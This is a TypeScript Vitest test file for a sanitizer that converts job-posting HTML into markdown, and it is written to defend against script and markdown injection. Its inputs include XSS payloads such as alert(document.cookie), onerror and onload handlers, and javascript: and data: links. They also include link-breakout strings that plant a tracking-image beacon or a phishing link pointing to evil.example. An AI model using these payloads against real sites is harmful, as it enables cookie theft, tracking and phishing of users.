import { describe, expect, it } from 'vitest'
import { MAX_DESCRIPTION_CHARS, htmlToMarkdown } from './html-to-markdown'

/**
 * AC6 — "Описание с внедрённым скриптом рендерится безопасно".
 *
 * This is the INGEST half of that guarantee: whatever the feed sends, what
 * lands in `job_postings.description_md` contains no HTML at all — and, since
 * the HIGH-1 finding below, no markdown syntax the feed did not legitimately
 * earn either. The RENDER half is pinned separately in
 * apps/web/app/components/job-sourcing/__tests__/JobSuggestionDialog.test.tsx,
 * where the guarantee rests on props that component sets ITSELF (urlTransform /
 * img / a) rather than on "we don't enable rehype-raw", which turned out not to
 * apply to a markdown-level payload at all.
 */
describe('htmlToMarkdown — script injection (AC6)', () => {
  it('drops a <script> tag AND its contents', () => {
    const md = htmlToMarkdown('<p>Hello</p><script>alert(document.cookie)</script>')
    expect(md).not.toContain('<script')
    expect(md).not.toContain('alert')
    expect(md).toContain('Hello')
  })

  it('drops an inline event handler along with its element', () => {
    const md = htmlToMarkdown('<img src=x onerror="alert(1)">Job description')
    expect(md).not.toContain('onerror')
    expect(md).not.toContain('<img')
    expect(md).toContain('Job description')
  })

  it('drops <iframe>, <object>, <embed> and <svg> contents', () => {
    for (const tag of ['iframe', 'object', 'embed', 'svg']) {
      const md = htmlToMarkdown(`<${tag}><script>alert(1)</script>payload</${tag}>text`)
      expect(md).not.toContain('payload')
      expect(md).not.toContain('alert')
      expect(md).toContain('text')
    }
  })

  it('renders a javascript: link as plain text, never as a markdown link', () => {
    const md = htmlToMarkdown('<a href="javascript:alert(1)">Click me</a>')
    expect(md).toBe('Click me')
    expect(md).not.toContain('javascript:')
    expect(md).not.toContain('](')
  })

  it('renders a data: link as plain text', () => {
    const md = htmlToMarkdown('<a href="data:text/html,<script>alert(1)</script>">x</a>')
    expect(md).not.toContain('data:')
    expect(md).not.toContain('](')
  })

  it('keeps a normal https link', () => {
    // Angle-bracket destination form since HIGH-1 — see the breakout suite below.
    expect(htmlToMarkdown('<a href="https://example.com/job">Apply</a>')).toBe(
      '[Apply](<https://example.com/job>)',
    )
  })

  it('escapes markdown/HTML metacharacters in text so they cannot become markup', () => {
    const md = htmlToMarkdown('&lt;script&gt;alert(1)&lt;/script&gt;')
    // The feed double-escaped it: after decoding it is TEXT, and the escaping
    // keeps it text — it must never re-enter the document as a tag.
    expect(md).not.toMatch(/<script>/)
    expect(md).toContain('script')
  })

  it('never emits a raw HTML tag for any input in a hostile corpus', () => {
    const hostile = [
      '<script>alert(1)</script>',
      '<SCRIPT >alert(1)</SCRIPT >',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<p onclick="alert(1)">text</p>',
      '<a href="javascript:alert(1)">x</a>',
      '<!--<script>alert(1)</script>-->',
      '<div><style>body{background:url(javascript:alert(1))}</style>text</div>',
      '<unclosed',
      '<a href="https://ok.dev">unterminated link',
    ]
    for (const input of hostile) {
      const md = htmlToMarkdown(input)
      // An UNESCAPED `<x` is what a markdown renderer could still read as a
      // tag; `\<x` is literal text and is the correct, safe output.
      expect(md, `input: ${input}`).not.toMatch(/(?<!\\)<[a-z!/]/i)
      expect(md, `input: ${input}`).not.toContain('javascript:')
    }
  })
})

/**
 * Security-review round 2, HIGH-1 — the EXACT payload, not the class.
 *
 * The old suite asserted "no raw tag" and "no `javascript:` substring". This
 * payload contains neither: it breaks out of the link DESTINATION with a `)`
 * (which `\S+` accepted) and the remainder becomes attacker-authored MARKDOWN.
 * Every case below is a concrete string, so a regression cannot hide behind a
 * generic "injection" assertion again.
 */
describe('htmlToMarkdown — link-destination breakout (HIGH-1)', () => {
  it('does not let a `)` in href close the link and start a markdown image', () => {
    const md = htmlToMarkdown(
      '<a href="https://ok.example/x)![](https://evil.example/px.png?leak=1">t</a>',
    )
    // The beacon must not exist in ANY form — neither as markdown image syntax
    // nor as a bare mention of the attacker host.
    expect(md).not.toContain('![](')
    expect(md).not.toContain('evil.example')
    expect(md).toBe('t')
  })

  it('does not let a `)` in href inject a second, phishing link', () => {
    const md = htmlToMarkdown(
      '<a href="https://ok.example/x)[Apply here](https://evil.example/phish">t</a>',
    )
    expect(md).not.toContain('evil.example')
    expect(md).toBe('t')
  })

  it('rejects every character that could break out of a quoted attribute', () => {
    // These all survive HTML attribute tokenization intact, so the destination
    // check is the ONLY thing standing between them and the output.
    for (const href of [
      'https://ok.example/a b',
      'https://ok.example/a(b',
      'https://ok.example/a)b',
      'https://ok.example/a[b',
      'https://ok.example/a]b',
      'https://ok.example/a<b',
      "https://ok.example/a'b",
      'https://ok.example/a\\b',
    ]) {
      const md = htmlToMarkdown(`<a href="${href}">t</a>`)
      expect(md, `href: ${href}`).not.toContain('](')
      expect(md, `href: ${href}`).toContain('t')
    }
  })

  it('truncates at the attribute/tag terminator rather than emitting the remainder', () => {
    // `"` closes the attribute and `>` closes the tag, so the href IS the safe
    // prefix — the leftover is stray text, never part of the destination. This
    // is asserted rather than left implicit because "it got truncated" and "it
    // got rejected" look identical from the outside and only one is safe.
    expect(htmlToMarkdown('<a href="https://ok.example/a"b">t</a>')).toBe(
      '[t](<https://ok.example/a>)',
    )
    expect(htmlToMarkdown('<a href="https://ok.example/a>b">t</a>')).not.toContain('](')
  })

  it('emits a legitimate destination in angle-bracket form (cannot be closed by `)`)', () => {
    expect(htmlToMarkdown('<a href="https://jobs.dou.ua/x/1">Apply</a>')).toBe(
      '[Apply](<https://jobs.dou.ua/x/1>)',
    )
    // A real DOU URL with hyphens and a query string still passes.
    expect(htmlToMarkdown('<a href="https://jobs.dou.ua/companies/epam-systems/?a=1">x</a>')).toBe(
      '[x](<https://jobs.dou.ua/companies/epam-systems/?a=1>)',
    )
  })

  it('does not let a trailing `!` before a link assemble into an image', () => {
    // Security-review round 3: `Great job!` + `[x](<url>)` is markdown for an
    // IMAGE. The exclamation mark comes from the description TEXT, the link
    // from a perfectly legitimate `<a>` — neither half looks hostile alone.
    const md = htmlToMarkdown('Great job!<a href="https://evil.example/px.png?leak=1">x</a>')
    expect(md).not.toMatch(/(?<!\\)!\[/)
    expect(md).toContain('\\!')
  })

  it('never emits an image, whatever the feed does', () => {
    for (const input of [
      '<img src="https://evil.example/px.png">',
      '<a href="https://ok.example/x)![](https://evil.example/px.png">t</a>',
      '<p>text</p><img src=x onerror=alert(1)>',
    ]) {
      expect(htmlToMarkdown(input), `input: ${input}`).not.toContain('![')
    }
  })
})

describe('htmlToMarkdown — structure preserved', () => {
  it('converts a realistic DOU description', () => {
    const md = htmlToMarkdown(
      '<p>We are looking for a <strong>Senior Engineer</strong>.</p>' +
        '<p><strong>Responsibilities</strong></p>' +
        '<ul><li>Design automation</li><li>Mentor others</li></ul>',
    )
    expect(md).toContain('**Senior Engineer**')
    expect(md).toContain('- Design automation')
    expect(md).toContain('- Mentor others')
  })

  it('numbers ordered list items', () => {
    const md = htmlToMarkdown('<ol><li>First</li><li>Second</li></ol>')
    expect(md).toContain('1. First')
    expect(md).toContain('2. Second')
  })

  it('converts headings', () => {
    expect(htmlToMarkdown('<h2>About us</h2>')).toBe('## About us')
  })

  it('turns <br> into a line break', () => {
    expect(htmlToMarkdown('a<br>b')).toBe('a\nb')
  })

  it('decodes named and numeric entities', () => {
    expect(htmlToMarkdown('R&amp;D &mdash; &#1050;&#1080;&#1111;&#1074;')).toBe('R&D — Київ')
  })

  it('keeps text from unknown tags but drops the tags', () => {
    expect(htmlToMarkdown('<table><tr><td>Salary</td></tr></table>')).toBe('Salary')
  })

  it('returns an empty string for empty input', () => {
    expect(htmlToMarkdown('')).toBe('')
    expect(htmlToMarkdown(null)).toBe('')
    expect(htmlToMarkdown(undefined)).toBe('')
  })

  it('truncates an absurdly long description instead of storing it whole', () => {
    const md = htmlToMarkdown(`<p>${'a'.repeat(MAX_DESCRIPTION_CHARS * 2)}</p>`)
    expect(md.length).toBeLessThanOrEqual(MAX_DESCRIPTION_CHARS + 1)
  })

  it('collapses runs of blank lines', () => {
    expect(htmlToMarkdown('<p>a</p><p></p><p></p><p>b</p>')).toBe('a\n\nb')
  })
})
